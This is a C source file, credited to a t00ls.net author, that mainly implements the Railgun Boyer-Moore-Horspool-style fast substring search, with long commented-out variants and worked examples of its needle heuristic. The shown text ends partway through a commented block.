// Author: skyer@t00ls.net

#include <ws2tcpip.h>
#include <windows.h>

#define alloc(a) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, a)
#define mfree(a) HeapFree(GetProcessHeap(), 0, a)
#pragma comment(lib,"Ws2_32.lib")
typedef unsigned int uint32_t;

typedef BOOLEAN (WINAPI *_RtlGenRandom)(
	PVOID RandomBuffer,
	ULONG RandomBufferLength
);

typedef struct _
{
	char* ip;
	unsigned int size;
	struct _* next;
} ipNode, *PipNode;

void Output(char *format, ...)
{
	char buf[1024];
	DWORD temp = 0;
	RtlSecureZeroMemory(buf, 1024);
	va_list arglist;
	va_start(arglist, format);
	wvsprintfA(buf, format, arglist);
	va_end(arglist);

	HANDLE hStdout = GetStdHandle(STD_OUTPUT_HANDLE);
	WriteConsoleA(hStdout, buf, lstrlenA(buf), &temp, 0);
}

#define NeedleThreshold2vs4swampLITE 9+10 // Should be bigger than 9. BMH2 works up to this value (inclusive), if bigger then BMH4 takes over.

char * Railgun_Swampshine_BailOut(char * pbTarget, char * pbPattern, uint32_t cbTarget, uint32_t cbPattern)
{
	char * pbTargetMax = pbTarget + cbTarget;
	register uint32_t ulHashPattern;
	signed long count;

	unsigned char bm_Horspool_Order2[256 * 256]; // Bitwise soon...
	uint32_t i, Gulliver;

	uint32_t PRIMALposition, PRIMALpositionCANDIDATE;
	uint32_t PRIMALlength, PRIMALlengthCANDIDATE;
	uint32_t j, FoundAtPosition;

	if (cbPattern > cbTarget) return(NULL);

	// This is the awesome 'Railgun_Quadruplet', it did outperform EVERYWHERE the fastest strstr (back in old GLIBCes ~2003, by the Dutch hacker Stephen R. van den Berg), suitable for short haystacks ~100bytes.
	// Caution: For better speed the case 'if (cbPattern==1)' was removed, so Pattern must be longer than 1 char.
	// char * Railgun_Quadruplet (char * pbTarget, char * pbPattern, unsigned long cbTarget, unsigned long cbPattern)
	/*
	// definitions area [
	char * pbTargetMax = pbTarget + cbTarget;
	register unsigned long  ulHashPattern;
	unsigned long ulHashTarget;
	unsigned long count;
	unsigned long countSTATIC;
	unsigned char SINGLET;
	unsigned long Quadruplet2nd;
	unsigned long Quadruplet3rd;
	unsigned long Quadruplet4th;
	unsigned long  AdvanceHopperGrass;
	// definitions area ]
	if (cbPattern > cbTarget)
	return(NULL);
	...
	} else { //if ( cbPattern<4)
	if (cbTarget<961) // This value is arbitrary(don't know how exactly), it ensures(at least must) better performance than 'Boyer_Moore_Horspool'.
	{
	pbTarget = pbTarget+cbPattern;
	ulHashPattern = *(unsigned long *)(pbPattern);
	//        countSTATIC = cbPattern-1;

	//SINGLET = *(char *)(pbPattern);
	SINGLET = ulHashPattern & 0xFF;
	Quadruplet2nd = SINGLET<<8;
	Quadruplet3rd = SINGLET<<16;
	Quadruplet4th = SINGLET<<24;

	for ( ;; )
	{
	AdvanceHopperGrass = 0;
	ulHashTarget = *(unsigned long *)(pbTarget-cbPattern);

	if ( ulHashPattern == ulHashTarget ) { // Three unnecessary comparisons here, but 'AdvanceHopperGrass' must be calculated - it has a higher priority.
	//         count = countSTATIC;
	//         while ( count && *(char *)(pbPattern+1+(countSTATIC-count)) == *(char *)(pbTarget-cbPattern+1+(countSTATIC-count)) ) {
	//	       if ( countSTATIC==AdvanceHopperGrass+count && SINGLET != *(char *)(pbTarget-cbPattern+1+(countSTATIC-count)) ) AdvanceHopperGrass++;
	//               count--;
	//         }
	count = cbPattern-1;
	while ( count && *(char *)(pbPattern+(cbPattern-count)) == *(char *)(pbTarget-count) ) {
	if ( cbPattern-1==AdvanceHopperGrass+count && SINGLET != *(char *)(pbTarget-count) ) AdvanceHopperGrass++;
	count--;
	}
	if ( count == 0) return((pbTarget-cbPattern));
	} else { // The goal here: to avoid memory accesses by stressing the registers.
	if ( Quadruplet2nd != (ulHashTarget & 0x0000FF00) ) {
	AdvanceHopperGrass++;
	if ( Quadruplet3rd != (ulHashTarget & 0x00FF0000) ) {
	AdvanceHopperGrass++;
	if ( Quadruplet4th != (ulHashTarget & 0xFF000000) ) AdvanceHopperGrass++;
	}
	}
	}

	AdvanceHopperGrass++;

	pbTarget = pbTarget + AdvanceHopperGrass;
	if (pbTarget > pbTargetMax)
	return(NULL);
	}
	} else { //if (cbTarget<961)
	*/

	if (cbPattern<4) {
		// SSE2 i.e. 128bit Assembly rules here, Mischa knows best:
		// ...
		pbTarget = pbTarget + cbPattern;
		ulHashPattern = ((*(char *)(pbPattern)) << 8) + *(pbPattern + (cbPattern - 1));
		if (cbPattern == 3) {
			for (;;) {
				if (ulHashPattern == ((*(char *)(pbTarget - 3)) << 8) + *(pbTarget - 1)) {
					if (*(char *)(pbPattern + 1) == *(char *)(pbTarget - 2)) return((pbTarget - 3));
				}
				if ((char)(ulHashPattern >> 8) != *(pbTarget - 2)) {
					pbTarget++;
					if ((char)(ulHashPattern >> 8) != *(pbTarget - 2)) pbTarget++;
				}
				pbTarget++;
				if (pbTarget > pbTargetMax) return(NULL);
			}
		}
		else {
		}
		for (;;) {
			if (ulHashPattern == ((*(char *)(pbTarget - 2)) << 8) + *(pbTarget - 1)) return((pbTarget - 2));
			if ((char)(ulHashPattern >> 8) != *(pbTarget - 1)) pbTarget++;
			pbTarget++;
			if (pbTarget > pbTargetMax) return(NULL);
		}
	}
	else { //if ( cbPattern<4 )
		if (cbPattern <= NeedleThreshold2vs4swampLITE) {
			// BMH order 2, needle should be >=4:
			ulHashPattern = *(uint32_t *)(pbPattern); // First four bytes
			for (i = 0; i < 256 * 256; i++) { bm_Horspool_Order2[i] = 0; }
			for (i = 0; i < cbPattern - 1; i++) bm_Horspool_Order2[*(unsigned short *)(pbPattern + i)] = 1;
			i = 0;
			while (i <= cbTarget - cbPattern) {
				Gulliver = 1; // 'Gulliver' is the skip
				if (bm_Horspool_Order2[*(unsigned short *)&pbTarget[i + cbPattern - 1 - 1]] != 0) {
					if (bm_Horspool_Order2[*(unsigned short *)&pbTarget[i + cbPattern - 1 - 1 - 2]] == 0) Gulliver = cbPattern - (2 - 1) - 2; else {
						if (*(uint32_t *)&pbTarget[i] == ulHashPattern) { // This fast check ensures not missing a match (for remainder) when going under 0 in loop below:
							count = cbPattern - 4 + 1;
							while (count > 0 && *(uint32_t *)(pbPattern + count - 1) == *(uint32_t *)(&pbTarget[i] + (count - 1)))
								count = count - 4;
							if (count <= 0) return(pbTarget + i);
						}
					}
				}
				else Gulliver = cbPattern - (2 - 1);
				i = i + Gulliver;
				//GlobalI++; // Comment it, it is only for stats.
			}
			return(NULL);
		}
		else { // if ( cbPattern<=NeedleThreshold2vs4swampLITE )

			// Swampwalker_BAILOUT heuristic order 4 (Needle should be bigger than 4) [
			// Needle: 1234567890qwertyuiopasdfghjklzxcv            PRIMALposition=01 PRIMALlength=33  '1234567890qwertyuiopasdfghjklzxcv'
			// Needle: vvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvv            PRIMALposition=29 PRIMALlength=04  'vvvv'
			// Needle: vvvvvvvvvvBOOMSHAKALAKAvvvvvvvvvv            PRIMALposition=08 PRIMALlength=20  'vvvBOOMSHAKALAKAvvvv'
			// Needle: Trollland                                    PRIMALposition=01 PRIMALlength=09  'Trollland'
			// Needle: Swampwalker                                  PRIMALposition=01 PRIMALlength=11  'Swampwalker'
			// Needle: licenselessness                              PRIMALposition=01 PRIMALlength=15  'licenselessness'
			// Needle: alfalfa                                      PRIMALposition=02 PRIMALlength=06  'lfalfa'
			// Needle: Sandokan                                     PRIMALposition=01 PRIMALlength=08  'Sandokan'
			// Needle: shazamish                                    PRIMALposition=01 PRIMALlength=09  'shazamish'
			// Needle: Simplicius Simplicissimus                    PRIMALposition=06 PRIMALlength=20  'icius Simplicissimus'
			// Needle: domilliaquadringenquattuorquinquagintillion  PRIMALposition=01 PRIMALlength=32  'domilliaquadringenquattuorquinqu'
			// Needle: boom-boom                                    PRIMALposition=02 PRIMALlength=08  'oom-boom'
			// Needle: vvvvv                                        PRIMALposition=01 PRIMALlength=04  'vvvv'
			// Needle: 12345                                        PRIMALposition=01 PRIMALlength=05  '12345'
			// Needle: likey-likey                                  PRIMALposition=03 PRIMALlength=09  'key-likey'
			// Needle: BOOOOOM                                      PRIMALposition=03 PRIMALlength=05  'OOOOM'
			// Needle: aaaaaBOOOOOM                                 PRIMALposition=02 PRIMALlength=09  'aaaaBOOOO'
			// Needle: BOOOOOMaaaaa                                 PRIMALposition=03 PRIMALlength=09  'OOOOMaaaa'
			PRIMALlength = 0;
			for (i = 0 + (1); i < cbPattern - ((4) - 1) + (1) - (1); i++) { // -(1) because the last BB (Building-Block) order 4 has no counterpart(s)
				FoundAtPosition = cbPattern - ((4) - 1) + 1;
				PRIMALpositionCANDIDATE = i;
				while (PRIMALpositionCANDIDATE <= (FoundAtPosition - 1)) {
					j = PRIMALpositionCANDIDATE + 1;
					while (j <= (FoundAtPosition - 1)) {
						if (*(uint32_t *)(pbPattern + PRIMALpositionCANDIDATE - (1)) == *(uint32_t *)(pbPattern + j - (1))) FoundAtPosition = j;
						j++;
					}
					PRIMALpositionCANDIDATE++;
				}
				PRIMALlengthCANDIDATE = (FoundAtPosition - 1) - i + 1 + ((4) - 1);
				if (PRIMALlengthCANDIDATE >= PRIMALlength) { PRIMALposition = i; PRIMALlength = PRIMALlengthCANDIDATE; }
				if (cbPattern - i + 1 <= PRIMALlength) break;
				if (PRIMALlength > 128) break; // Bail Out for 129[+]
			}
			// Swampwalker_BAILOUT heuristic order 4 (Needle should be bigger than 4) ]

			// Swampwalker_BAILOUT heuristic order 2 (Needle should be bigger than 2) [
			// Needle: 1234567890qwertyuiopasdfghjklzxcv            PRIMALposition=01 PRIMALlength=33  '1234567890qwertyuiopasdfghjklzxcv'
			// Needle: vvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvv            PRIMALposition=31 PRIMALlength=02  'vv'
			// Needle: vvvvvvvvvvBOOMSHAKALAKAvvvvvvvvvv            PRIMALposition=09 PRIMALlength=13  'vvBOOMSHAKALA'
			// Needle: Trollland                                    PRIMALposition=05 PRIMALlength=05  'lland'
			// Needle: Swampwalker                                  PRIMALposition=03 PRIMALlength=09  'ampwalker'
			// Needle: licenselessness                              PRIMALposition=01 PRIMALlength=13  'licenselessne'
			// Needle: alfalfa                                      PRIMALposition=04 PRIMALlength=04  'alfa'
			// Needle: Sandokan                                     PRIMALposition=01 PRIMALlength=07  'Sandoka'
			// Needle: shazamish                                    PRIMALposition=02 PRIMALlength=08  'hazamish'
			// Needle: Simplicius Simplicissimus                    PRIMALposition=08 PRIMALlength=15  'ius Simplicissi'
			// Needle: domilliaquadringenquattuorquinquagintillion  PRIMALposition=01 PRIMALlength=19  'domilliaquadringenq'
			// Needle: DODO                                         PRIMALposition=02 PRIMALlength=03  'ODO'
			// Needle: DODOD                                        PRIMALposition=03 PRIMALlength=03  'DOD'
			// Needle: aaaDODO                                      PRIMALposition=02 PRIMALlength=05  'aaDOD'
			// Needle: aaaDODOD                                     PRIMALposition=02 PRIMALlength=05  'aaDOD'
			// Needle: DODOaaa                                      PRIMALposition=02 PRIMALlength=05  'ODOaa'
			// Needle: DODODaaa                                     PRIMALposition=03 PRIMALlength=05  'DODaa'
			/*
			PRIMALlength=0;
			for (i=0+(1); i < cbPattern-2+1+(1)-(1); i++) { // -(1) because the last BB order 2 has no counterpart(s)
			FoundAtPosition = cbPattern;
			PRIMALpositionCANDIDATE=i;
			while ( PRIMALpositionCANDIDATE <= (FoundAtPosition-1) ) {
			j = PRIMALpositionCANDIDATE + 1;
			while ( j <= (FoundAtPosition-1) ) {
			if ( *(unsigned short *)(pbPattern+PRIMALpositionCANDIDATE-(1)) == *(unsigned short *)(pbPattern+j-(1)) ) FoundAtPosition = j;
			j++;
			}
			PRIMALpositionCANDIDATE++;
			}
			PRIMALlengthCANDIDATE = (FoundAtPosition-1)-i+(2);
			if (PRIMALlengthCANDIDATE >= PRIMALlength) {PRIMALposition=i; PRIMALlength = PRIMALlengthCANDIDATE;}
			}
			*/
			// Swampwalker_BAILOUT heuristic order 2 (Needle should be bigger than 2) ]

			/*
			Legend:
			'[]' points to BB forming left or right boundary;
			'{}' points to BB being searched for;
			'()' position of duplicate and new right boundary;

			00000000011111111112222222222333
			12345678901234567890123456789012
			Example #1 for Needle: 1234567890qwertyuiopasdfghjklzxcv  NewNeedle = '1234567890qwertyuiopasdfghjklzxcv'
			Example #2 for Needle: vvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvv  NewNeedle = 'vv'
			Example #3 for Needle: vvvvvvvvvvBOOMSHAKALAKAvvvvvvvvvv  NewNeedle = 'vvBOOMSHAKALA'


			PRIMALlength=00; FoundAtPosition=33;
			Step 01_00: {}[12]34567890qwertyuiopasdfghjklzxc[v?] ! For position #01 the initial boundaries are PRIMALpositionCANDIDATE=LeftBoundary=01, RightBoundary=FoundAtPosition-1, the CANDIDATE PRIMAL string length is RightBoundary-LeftBoundary+(2)=(33-1)-01+(2)=33 !
			Step 01_01: [{12}]34567890qwertyuiopasdfghjklzxc[v?] ! Searching for '12', FoundAtPosition = 33, PRIMALlengthCANDIDATE=RightBoundary-LeftBoundary+(2)=(33-1)-01+(2)=33 !
			Step 01_02: [1{2]3}4567890qwertyuiopasdfghjklzxc[v?] ! Searching for '23', FoundAtPosition = 33, PRIMALlengthCANDIDATE=RightBoundary-LeftBoundary+(2)=(33-1)-01+(2)=33 !
			...
			Step 01_30: [12]34567890qwertyuiopasdfghjkl{zx}c[v?] ! Searching for 'zx', FoundAtPosition = 33, PRIMALlengthCANDIDATE=RightBoundary-LeftBoundary+(2)=(33-1)-01+(2)=33 !
			Step 01_31: [12]34567890qwertyuiopasdfghjklz{xc}[v?] ! Searching for 'xc', FoundAtPosition = 33, PRIMALlengthCANDIDATE=RightBoundary-LeftBoundary+(2)=(33-1)-01+(2)=33 !
			if (PRIMALlengthCANDIDATE >= PRIMALlength) {PRIMALposition=PRIMALpositionCANDIDATE; PRIMALlength = PRIMALlengthCANDIDATE;}
			Step 02_00: {}1[23]4567890qwertyuiopasdfghjklzxc[v?] ! For position #02 the initial boundaries are PRIMALpositionCANDIDATE=LeftBoundary=02, RightBoundary=FoundAtPosition-1, the CANDIDATE PRIMAL string length is RightBoundary-LeftBoundary+(2)=(33-1)-02+(2)=32 !
			Step 02_01: 1[{23}]4567890qwertyuiopasdfghjklzxc[v?] ! Searching for '23', FoundAtPosition = 33, PRIMALlengthCANDIDATE=RightBoundary-LeftBoundary+(2)=(33-1)-02+(2)=32 !
			Step 02_02: 1[2{3]4}567890qwertyuiopasdfghjklzxc[v?] ! Searching for '34', FoundAtPosition = 33, PRIMALlengthCANDIDATE=RightBoundary-LeftBoundary+(2)=(33-1)-02+(2)=32 !
			...
			Step 02_29: 1[23]4567890qwertyuiopasdfghjkl{zx}c[v?] ! Searching for 'zx', FoundAtPosition = 33, PRIMALlengthCANDIDATE=RightBoundary-LeftBoundary+(2)=(33-1)-02+(2)=32 !
			Step 02_30: 1[23]4567890qwertyuiopasdfghjklz{xc}[v?] ! Searching for 'xc', FoundAtPosition = 33, PRIMALlengthCANDIDATE=RightBoundary-LeftBoundary+(2)=(33-1)-02+(2)=32 !
			if (PRIMALlengthCANDIDATE >= PRIMALlength) {PRIMALposition=PRIMALpositionCANDIDATE; PRIMALlength = PRIMALlengthCANDIDATE;}
			...
			Step 31_00: {}1234567890qwertyuiopasdfghjklz[xc][v?] ! For position #31 the initial boundaries are PRIMALpositionCANDIDATE=LeftBoundary=31, RightBoundary=FoundAtPosition-1, the CANDIDATE PRIMAL string length is RightBoundary-LeftBoundary+(2)=(33-1)-31+(2)=03 !
			Step 31_01: 1234567890qwertyuiopasdfghjklz[{xc}][v?] ! Searching for 'xc', FoundAtPosition = 33, PRIMALlengthCANDIDATE=RightBoundary-LeftBoundary+(2)=(33-1)-31+(2)=03 !
			if (PRIMALlengthCANDIDATE >= PRIMALlength) {PRIMALposition=PRIMALpositionCANDIDATE; PRIMALlength = PRIMALlengthCANDIDATE;}
			Result:
			PRIMALposition=01 PRIMALlength=33, NewNeedle = '1234567890qwertyuiopasdfghjklzxcv'


			PRIMALlength=00; FoundAtPosition=33;
			Step 01_00: {}[vv]vvvvvvvvvvvvvvvvvvvvvvvvvvvvvv[v?] ! For position #01 the initial boundaries are PRIMALpositionCANDIDATE=LeftBoundary=01, RightBoundary=FoundAtPosition-1, the CANDIDATE PRIMAL string length is RightBoundary-LeftBoundary+(2)=(33-1)-01+(2)=33 !
			Step 01_01: [{v(v}]v)vvvvvvvvvvvvvvvvvvvvvvvvvvvvvv  ! Searching for 'vv', FoundAtPosition = 02, PRIMALlengthCANDIDATE=RightBoundary-LeftBoundary+(2)=(02-1)-01+(2)=02 !
			if (PRIMALlengthCANDIDATE >= PRIMALlength) {PRIMALposition=PRIMALpositionCANDIDATE; PRIMALlength = PRIMALlengthCANDIDATE;}
			Step 02_00: {}v[vv]vvvvvvvvvvvvvvvvvvvvvvvvvvvvv[v?] ! For position #02 the initial boundaries are PRIMALpositionCANDIDATE=LeftBoundary=02, RightBoundary=FoundAtPosition-1, the CANDIDATE PRIMAL string length is RightBoundary-LeftBoundary+(2)=(33-1)-02+(2)=32 !
			Step 02_01: v[{v(v}]v)vvvvvvvvvvvvvvvvvvvvvvvvvvvvv  ! Searching for 'vv', FoundAtPosition = 03, PRIMALlengthCANDIDATE=RightBoundary-LeftBoundary+(2)=(03-1)-02+(2)=02 !
			if (PRIMALlengthCANDIDATE >= PRIMALlength) {PRIMALposition=PRIMALpositionCANDIDATE; PRIMALlength = PRIMALlengthCANDIDATE;}
			...
			Step 31_00: {}vvvvvvvvvvvvvvvvvvvvvvvvvvvvvv[vv][v?] ! For position #31 the initial boundaries are PRIMALpositionCANDIDATE=LeftBoundary=31, RightBoundary=FoundAtPosition-1, the CANDIDATE PRIMAL string length is RightBoundary-LeftBoundary+(2)=(33-1)-31+(2)=03 !
			Step 31_01: vvvvvvvvvvvvvvvvvvvvvvvvvvvvvv[{v(v}]v)  ! Searching for 'vv', FoundAtPosition = 32, PRIMALlengthCANDIDATE=RightBoundary-LeftBoundary+(2)=(32-1)-31+(2)=02 !
			if (PRIMALlengthCANDIDATE >= PRIMALlength) {PRIMALposition=PRIMALpositionCANDIDATE; PRIMALlength = PRIMALlengthCANDIDATE;}
			Result:
			PRIMALposition=31 PRIMALlength=02, NewNeedle = 'vv'


			PRIMALlength=00; FoundAtPosition=33;
			Step 01_00: {}[vv]vvvvvvvvBOOMSHAKALAKAvvvvvvvvv[v?] ! For position #01 the initial boundaries are PRIMALpositionCANDIDATE=LeftBoundary=01, RightBoundary=FoundAtPosition-1, the CANDIDATE PRIMAL string length is RightBoundary-LeftBoundary+(2)=(33-1)-01+(2)=33 !
			Step 01_01: [{v(v}]v)vvvvvvvBOOMSHAKALAKAvvvvvvvvvv  ! Searching for 'vv', FoundAtPosition = 02, PRIMALlengthCANDIDATE=RightBoundary-LeftBoundary+(2)=(02-1)-01+(2)=02 !
			if (PRIMALlengthCANDIDATE >= PRIMALlength) {PRIMALposition=PRIMALpositionCANDIDATE; PRIMALlength = PRIMALlengthCANDIDATE;}
			Step 02_00: {}v[vv]vvvvvvvBOOMSHAKALAKAvvvvvvvvv[v?] ! For position #02 the initial boundaries are PRIMALpositionCANDIDATE=LeftBoundary=02, RightBoundary=FoundAtPosition-1, the CANDIDATE PRIMAL string length is RightBoundary-LeftBoundary+(2)=(33-1)-02+(2)=32 !
			Step 02_01: v[{v(v}]v)vvvvvvBOOMSHAKALAKAvvvvvvvvvv  ! Searching for 'vv', FoundAtPosition = 03, PRIMALlengthCANDIDATE=RightBoundary-LeftBoundary+(2)=(03-1)-02+(2)=02 !
			if (PRIMALlengthCANDIDATE >= PRIMALlength) {PRIMALposition=PRIMALpositionCANDIDATE; PRIMALlength = PRIMALlengthCANDIDATE;}
			...
			Step 09_00: {}vvvvvvvv[vv]BOOMSHAKALAKAvvvvvvvvv[v?] ! For position #09 the initial boundaries are PRIMALpositionCANDIDATE=LeftBoundary=09, RightBoundary=FoundAtPosition-1, the CANDIDATE PRIMAL string length is RightBoundary-LeftBoundary+(2)=(33-1)-09+(2)=25 !
			Step 09_01: vvvvvvvv[{vv}]BOOMSHAKALAKA(vv)vvvvvvvv  ! Searching for 'vv', FoundAtPosition = 24, PRIMALlengthCANDIDATE=RightBoundary-LeftBoundary+(2)=(24-1)-09+(2)=16 !
			Step 09_02: vvvvvvvv[v{v]B}OOMSHAKALAKA[vv]vvvvvvvv  ! Searching for 'vB', FoundAtPosition = 24, PRIMALlengthCANDIDATE=RightBoundary-LeftBoundary+(2)=(24-1)-09+(2)=16 !
			Step 09_03: vvvvvvvv[vv]{BO}OMSHAKALAKA[vv]vvvvvvvv  ! Searching for 'BO', FoundAtPosition = 24, PRIMALlengthCANDIDATE=RightBoundary-LeftBoundary+(2)=(24-1)-09+(2)=16 !
			Step 09_04: vvvvvvvv[vv]B{OO}MSHAKALAKA[vv]vvvvvvvv  ! Searching for 'OO', FoundAtPosition = 24, PRIMALlengthCANDIDATE=RightBoundary-LeftBoundary+(2)=(24-1)-09+(2)=16 !
			Step 09_05: vvvvvvvv[vv]BO{OM}SHAKALAKA[vv]vvvvvvvv  ! Searching for 'OM', FoundAtPosition = 24, PRIMALlengthCANDIDATE=RightBoundary-LeftBoundary+(2)=(24-1)-09+(2)=16 !
			Step 09_06: vvvvvvvv[vv]BOO{MS}HAKALAKA[vv]vvvvvvvv  ! Searching for 'MS', FoundAtPosition = 24, PRIMALlengthCANDIDATE=RightBoundary-LeftBoundary+(2)=(24-1)-09+(2)=16 !
			Step 09_07: vvvvvvvv[vv]BOOM{SH}AKALAKA[vv]vvvvvvvv  ! Searching for 'SH', FoundAtPosition = 24, PRIMALlengthCANDIDATE=RightBoundary-LeftBoundary+(2)=(24-1)-09+(2)=16 !
			Step 09_08: vvvvvvvv[vv]BOOMS{HA}KALAKA[vv]vvvvvvvv  ! Searching for 'HA', FoundAtPosition = 24, PRIMALlengthCANDIDATE=RightBoundary-LeftBoundary+(2)=(24-1)-09+(2)=16 !
			Step 09_09: vvvvvvvv[vv]BOOMSH{AK}AL(AK)Avvvvvvvvvv  ! Searching for 'AK', FoundAtPosition = 21, PRIMALlengthCANDIDATE=RightBoundary-LeftBoundary+(2)=(21-1)-09+(2)=13 !
			Step 09_10: vvvvvvvv[vv]BOOMSHA{KA}L[AK]Avvvvvvvvvv  ! Searching for 'KA', FoundAtPosition = 21, PRIMALlengthCANDIDATE=RightBoundary-LeftBoundary+(2)=(21-1)-09+(2)=13 !
			Step 09_11: vvvvvvvv[vv]BOOMSHAK{AL}[AK]Avvvvvvvvvv  ! Searching for 'AL', FoundAtPosition = 21, PRIMALlengthCANDIDATE=RightBoundary-LeftBoundary+(2)=(21-1)-09+(2)=13 !
			Step 09_12: vvvvvvvv[vv]BOOMSHAKA{L[A}K]Avvvvvvvvvv  ! Searching for 'LA', FoundAtPosition = 21, PRIMALlengthCANDIDATE=RightBoundary-LeftBoundary+(2)=(21-1)-09+(2)=13 !
			if (PRIMALlengthCANDIDATE >= PRIMALlength) {PRIMALposition=PRIMALpositionCANDIDATE; PRIMALlength = PRIMALlengthCANDIDATE;}
			...
			Step 31_00: {}vvvvvvvv[vv]BOOMSHAKALAKAvvvvvvvvv[v?] ! For position #31 the initial boundaries are PRIMALpositionCANDIDATE=LeftBoundary=31, RightBoundary=FoundAtPosition-1, the CANDIDATE PRIMAL string length is RightBoundary-LeftBoundary+(2)=(33-1)-31+(2)=03 !
			Step 31_01: vvvvvvvvvvBOOMSHAKALAKAvvvvvvv[{v(v}]v)  ! Searching for 'vv', FoundAtPosition = 32, PRIMALlengthCANDIDATE=RightBoundary-LeftBoundary+(2)=(32-1)-31+(2)=02 !
			if (PRIMALlengthCANDIDATE >= PRIMALlength) {PRIMALposition=PRIMALpositionCANDIDATE; PRIMALlength = PRIMALlengthCANDIDATE;}
			Result:
			PRIMALposition=09 PRIMALlength=13, NewNeedle = 'vvBOOMSHAKALA'
			*/

			// Here we have 4 or bigger NewNeedle, apply order 2 for pbPattern[i+(PRIMALposition-1)] with length 'PRIMALlength' and compare the pbPattern[i] with length 'cbPattern':
			PRIMALlengthCANDIDATE = cbPattern;
			cbPattern = PRIMALlength;
			pbPattern = pbPattern + (PRIMALposition - 1);

			// Revision 2 commented section [
			/*
			if (cbPattern-1 <= 255) {
			// BMH Order 2 [
			ulHashPattern = *(uint32_t *)(pbPattern); // First four bytes
			for (i=0; i < 256*256; i++) {bm_Horspool_Order2[i]= cbPattern-1;} // cbPattern-(Order-1) for Horspool; 'memset' if not optimized
			for (i=0; i < cbPattern-1; i++) bm_Horspool_Order2[*(unsigned short *)(pbPattern+i)]=i; // Rightmost appearance/position is needed
			i=0;
			while (i <= cbTarget-cbPattern) {
			Gulliver = bm_Horspool_Order2[*(unsigned short *)&pbTarget[i+cbPattern-1-1]];
			if ( Gulliver != cbPattern-1 ) { // CASE #2: if equal means the pair (char order 2) is not found i.e. Gulliver remains intact, skip the whole pattern and fall back (Order-1) chars i.e. one char for Order 2
			if ( Gulliver == cbPattern-2 ) { // CASE #1: means the pair (char order 2) is found
			if ( *(uint32_t *)&pbTarget[i] == ulHashPattern) {
			count = cbPattern-4+1;
			while ( count > 0 && *(uint32_t *)(pbPattern+count-1) == *(uint32_t *)(&pbTarget[i]+(count-1)) )
			count = count-4;
			// If we miss to hit then no need to compare the original: Needle
			if ( count <= 0 ) {
			// I have to add out-of-range checks...
			// i-(PRIMALposition-1) >= 0
			// &pbTarget[i-(PRIMALposition-1)] <= pbTargetMax - 4
			// i-(PRIMALposition-1)+(count-1) >= 0
			// &pbTarget[i-(PRIMALposition-1)+(count-1)] <= pbTargetMax - 4

			// "FIX" from 2014-Apr-27:
			// Because (count-1) is negative, above fours are reduced to next twos:
			// i-(PRIMALposition-1)+(count-1) >= 0
			// &pbTarget[i-(PRIMALposition-1)] <= pbTargetMax - 4
			// The line below is BUGGY:
			//if ( (i-(PRIMALposition-1) >= 0) && (&pbTarget[i-(PRIMALposition-1)] <= pbTargetMax - 4) && (&pbTarget[i-(PRIMALposition-1)+(count-1)] <= pbTargetMax - 4) ) {
			// The line below is NOT OKAY, in fact so stupid, grrr, not a blunder, not carelessness, but overconfidence in writing "on the fly":
			//if ( ((signed int)(i-(PRIMALposition-1)+(count-1)) >= 0) && (&pbTarget[i-(PRIMALposition-1)] <= pbTargetMax - 4) ) {
			// FIX from 2016-Aug-10 (two times failed to do simple boundary checks, pfu):
			if ( ((signed int)(i-(PRIMALposition-1)) >= 0) && (&pbTarget[i-(PRIMALposition-1)]+((PRIMALlengthCANDIDATE-4+1)-1) <= pbTargetMax - 4) ) {
			if ( *(uint32_t *)&pbTarget[i-(PRIMALposition-1)] == *(uint32_t *)(pbPattern-(PRIMALposition-1))) { // This fast check ensures not missing a match (for remainder) when going under 0 in loop below:
			count = PRIMALlengthCANDIDATE-4+1;
			while ( count > 0 && *(uint32_t *)(pbPattern-(PRIMALposition-1)+count-1) == *(uint32_t *)(&pbTarget[i-(PRIMALposition-1)]+(count-1)) )
			count = count-4;
			if ( count <= 0 ) return(pbTarget+i-(PRIMALposition-1));
			}
			}
			}
			}
			Gulliver = 1;
			} else
			Gulliver = cbPattern - Gulliver - 2; // CASE #3: the pair is found and not as suffix i.e. rightmost position
			}
			i = i + Gulliver;
			//GlobalI++; // Comment it, it is only for stats.
			}
			return(NULL);
			// BMH Order 2 ]
			} else {
			// BMH order 2, needle should be >=4:
			ulHashPattern = *(uint32_t *)(pbPattern); // First four bytes
			for (i=0; i < 256*256; i++) {bm_Horspool_Order2[i]=0;}
			for (i=0; i < cbPattern-1; i++) bm_Horspool_Order2[*(unsigned short *)(pbPattern+i)]=1;
			i=0;
			while (i <= cbTarget-cbPattern) {
			Gulliver = 1; // 'Gulliver' is the skip
			if ( bm_Horspool_Order2[*(unsigned short *)&pbTarget[i+cbPattern-1-1]] != 0 ) {
			if ( bm_Horspool_Order2[*(unsigned short *)&pbTarget[i+cbPattern-1-1-2]] == 0 ) Gulliver = cbPattern-(2-1)-2; else {
			if ( *(uint32_t *)&pbTarget[i] == ulHashPattern) { // This fast check ensures not missing a match (for remainder) when going under 0 in loop below:
			count = cbPattern-4+1;
			while ( count > 0 && *(uint32_t *)(pbPattern+count-1) == *(uint32_t *)(&pbTarget[i]+(count-1)) )
			count = count-4;
			// If we miss to hit then no need to compare the original: Needle
			if ( count <= 0 ) {
			// I have to add out-of-range checks...
			// i-(PRIMALposition-1) >= 0
			// &pbTarget[i-(PRIMALposition-1)] <= pbTargetMax - 4
			// i-(PRIMALposition-1)+(count-1) >= 0
			// &pbTarget[i-(PRIMALposition-1)+(count-1)] <= pbTargetMax - 4

			// "FIX" from 2014-Apr-27:
			// Because (count-1) is negative, above fours are reduced to next twos:
			// i-(PRIMALposition-1)+(count-1) >= 0
			// &pbTarget[i-(PRIMALposition-1)] <= pbTargetMax - 4
			// The line below is BUGGY:
			//if ( (i-(PRIMALposition-1) >= 0) && (&pbTarget[i-(PRIMALposition-1)] <= pbTargetMax - 4) && (&pbTarget[i-(PRIMALposition-1)+(count-1)] <= pbTargetMax - 4) ) {
			// The line below is NOT OKAY, in fact so stupid, grrr, not a blunder, not carelessness, but overconfidence in writing "on the fly":
			//if ( ((signed int)(i-(PRIMALposition-1)+(count-1)) >= 0) && (&pbTarget[i-(PRIMALposition-1)] <= pbTargetMax - 4) ) {
			// FIX from 2016-Aug-10 (two times failed to do simple boundary checks, pfu):
			if ( ((signed int)(i-(PRIMALposition-1)) >= 0) && (&pbTarget[i-(PRIMALposition-1)]+((PRIMALlengthCANDIDATE-4+1)-1) <= pbTargetMax - 4) ) {
